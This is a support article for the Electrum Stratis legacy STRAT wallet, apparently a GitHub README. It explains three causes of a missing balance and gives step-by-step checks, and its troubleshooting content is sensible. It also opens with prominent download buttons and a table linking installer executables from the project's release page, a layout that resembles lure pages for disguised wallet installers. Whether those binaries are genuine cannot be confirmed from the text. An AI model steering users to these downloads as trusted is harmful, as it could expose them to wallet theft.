![Electrum-Stratis](assets/banner-article.png)

# Why is my balance missing? Three causes, and how to tell them apart

<p align="center">Three causes, three checks</p>

<p align="center"><a href="https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.exe"><img alt="Download for Windows" src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-089ae8?style=for-the-badge&labelColor=071727&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA4OCA4OCI%2BPHBhdGggZmlsbD0iI2ZmZmZmZiIgZD0iTTAgMTIuNCAzNS43IDcuNXYzNC4zSDB6TTQwIDYuOSA4OCAwdjQxLjhINDB6TTAgNDYuMmgzNS43djM0LjRMMCA3NS42ek00MCA0Ni4yaDQ4Vjg4bC00OC02Ljl6Ii8%2BPC9zdmc%2B&logoColor=ffffff"></a> <a href="https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.dmg"><img alt="Download for macOS" src="https://img.shields.io/badge/DOWNLOAD-MACOS-089ae8?style=for-the-badge&labelColor=071727&logo=apple&logoColor=ffffff"></a> <a href="https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.zip"><img alt="Download for Linux" src="https://img.shields.io/badge/DOWNLOAD-LINUX-089ae8?style=for-the-badge&labelColor=071727&logo=linux&logoColor=ffffff"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img alt="Windows" height="24" src="https://img.shields.io/badge/os-windows-089ae8?style=flat-square&labelColor=071727&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA4OCA4OCI%2BPHBhdGggZmlsbD0iI2ZmZmZmZiIgZD0iTTAgMTIuNCAzNS43IDcuNXYzNC4zSDB6TTQwIDYuOSA4OCAwdjQxLjhINDB6TTAgNDYuMmgzNS43djM0LjRMMCA3NS42ek00MCA0Ni4yaDQ4Vjg4bC00OC02Ljl6Ii8%2BPC9zdmc%2B&logoColor=ffffff"> | Windows 10 (1909) or later, 64-bit | [`electrum-stratis-v2.7.19.exe`](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.exe) |
| <img alt="macOS" height="24" src="https://img.shields.io/badge/os-macos-089ae8?style=flat-square&labelColor=071727&logo=apple&logoColor=ffffff"> | macOS 12 or later | [`electrum-stratis-v2.7.19.dmg`](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.dmg) |
| <img alt="Linux" height="24" src="https://img.shields.io/badge/os-linux-089ae8?style=flat-square&labelColor=071727&logo=linux&logoColor=ffffff"> | x64, Ubuntu 20.04 or later, or equivalent | [`electrum-stratis-v2.7.19.zip`](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.zip) |

</div>

All versions, installers and checksums are on the [Electrum-Stratis v2.7.19 release page](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/tag/v2.7.19).

> Only download from this GitHub release page.

A missing balance in Electrum Stratis has three causes, and they need different fixes: the wallet is behind the chain, the transaction has not confirmed or was dropped, or you are looking at a different wallet than the one that holds the coins. The wallet's balance-verification view compares its own total against an independent source and shows the difference, which is the fastest way to tell which of the three you have.

## You'll see this if

<div align="center">

| What you see | Most likely cause | First check |
|---|---|---|
| Balance is zero and the block height has not moved | Wallet is not synced to the chain | Chain liveness panel |
| Balance is zero but the height looks current | Wrong wallet file, different seed, or a watch-only view | Address comparison |
| A send is stuck and the balance never dropped | Transaction unconfirmed or dropped from the mempool | Transaction status |
| Coins were sent from an exchange and never arrived | Exchange delay, or a send to a different chain or asset | Transaction ID on a block explorer |
| Balance reappears after a rescan, then changes again | Stale UTXO set or a spent input the wallet had not seen | Balance verification delta |

</div>

The pattern to hold on to: a wallet can be running perfectly and still show nothing, because "running" and "synced" are different states. The wallet is well maintained - the current release is on the [release page](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/tag/v2.7.19) - and it states both separately.

## Why it happens

A balance is not stored anywhere; it is computed from the coins the wallet can see at its current height. If the height is behind, coins received after that height do not exist yet from the wallet's point of view. If the height is current but the wallet is a different wallet, the coins exist and belong to addresses this file does not control. If the transaction is still pending, the coins have not moved yet at all.

The legacy chain adds a fourth wrinkle worth naming: this wallet holds legacy STRAT and nothing else. Coins sent as STRAX, or sent on a newer chain, are not late - they are on a different chain, and no amount of rescanning will make them appear here. The wallet's legacy-chain banner states which chain it serves, so this is checkable rather than a guess.

Sync failure has its own article because it is the most common of the three and the most fixable: a wallet with no peers cannot advance, and it will look like an empty wallet rather than a broken one.

## Fix

1. **Check the height and the last block age.** Open the connection health panel. If the height is behind the current chain height, or the last block is hours old, the balance problem is a sync problem: fix the connection first and re-check afterwards.
2. **Check the transaction, not the balance.** Look up the transaction ID in the history. Confirmed, pending and absent are three different answers. A pending transaction can be rebroadcast; an absent one was never seen by the network and needs to be sent again.
3. **Confirm which wallet you opened.** Compare an address shown in the wallet with an address you know received funds. If the addresses differ, the file is a different wallet - often an older install, a watch-only import, or a restore from a different seed ([the three Electrum Stratis backups](https://github.com/electrum-stratis-project/electrum-stratis-recovery/blob/main/seed-file-and-password-backups.md)).
4. **Read the balance-verification delta.** The wallet compares its own total with an independent source and states the difference. A zero delta with a zero balance means the wallet sees the chain correctly and the coins are not at these addresses. A non-zero delta means the local view is stale.
5. **Rescan when the delta is non-zero.** A rescan rebuilds the wallet's view of its own history. It is the correct fix for stale UTXOs and for a wallet that received coins while it was offline; it does not find coins that belong to a different seed.

Nothing in this sequence requires a seed, a private key or a password, and no step should ever ask for one. If a page or a person asks for any of them while "checking your balance", the request is hostile.

## If that did not work

If the height is current, the transaction is confirmed, the addresses match and the delta is zero, then the coins are not in this wallet. The remaining explanation is almost always a different wallet: a second `.dat` file, a seed restored into the wrong lineage, or funds sent to an address from another wallet entirely.

If the coins are on a different chain, this is not a balance bug and cannot be fixed by the wallet. The legacy-chain banner exists precisely so that this is stated rather than discovered.

Small balances are worth the same care as large ones. Restoring a few tenths of a coin can take several attempts - rescan, rebroadcast, address comparison - and the effort is normal rather than a sign that something is deeply wrong. What is not normal is a service offering to do it for a fee: the operations that recover a balance are all local and free.

## Prevention

- Let the wallet reach the current height before concluding anything about a balance.
- Keep one wallet file per wallet, named clearly, and know which seed belongs to which file.
- Record transaction IDs for incoming transfers until they confirm.
- Check the receive address on screen before every incoming payment.
- Keep a small test amount in a new wallet until a full receive-and-spend cycle has worked.

## FAQ

### Why isn't my Bitcoin wallet showing my balance?

In most Bitcoin-family wallets it is either a display or sync delay, or the wallet is looking at addresses that do not hold the coins. Electrum Stratis separates those two cases: the height shows whether the wallet is current, and the balance-verification delta shows whether its local view matches an independent source. A generic "just wait" answer is only right when the height is actually behind.

### I transferred tokens but they are not showing up. What now?

Find the transaction ID and check whether it is confirmed, pending or unknown. A pending transfer can be rebroadcast; an unknown one never reached the network and must be sent again. If the transaction is confirmed and the addresses match, the wallet needs a rescan rather than a new transfer.

### It took me several attempts to recover 0.4 STRAT. Is that normal?

Yes. Small balances usually come back through a combination of rescan, rebroadcast and confirming the right wallet file, and each attempt teaches you which of the three causes you are dealing with. The fact that it took effort does not mean the funds were at risk; it means the diagnosis took a few passes.

### Does rescanning find coins from another wallet?

No. A rescan rebuilds this wallet's view of its own addresses. Coins controlled by a different seed, or sitting on a different chain, stay invisible no matter how many times you rescan.

<!-- DOWNLOAD-BLOCK -->

## Related articles

- [Why "Not Connected" happens](https://github.com/electrum-stratis-project/electrum-stratis-fixes/blob/main/wallet-says-not-connected.md)
- [Is Electrum Stratis safe to use?](https://github.com/electrum-stratis-project/electrum-stratis-guides/blob/main/how-safe-is-the-desktop-wallet.md)
- [Electrum Stratis password recovery: what is possible](https://github.com/electrum-stratis-project/electrum-stratis-recovery/blob/main/password-cannot-be-recovered.md)
- [The Qt wallet does not work with a seed](https://github.com/electrum-stratis-project/electrum-stratis-recovery/blob/main/qt-wallet-has-no-seed.md)
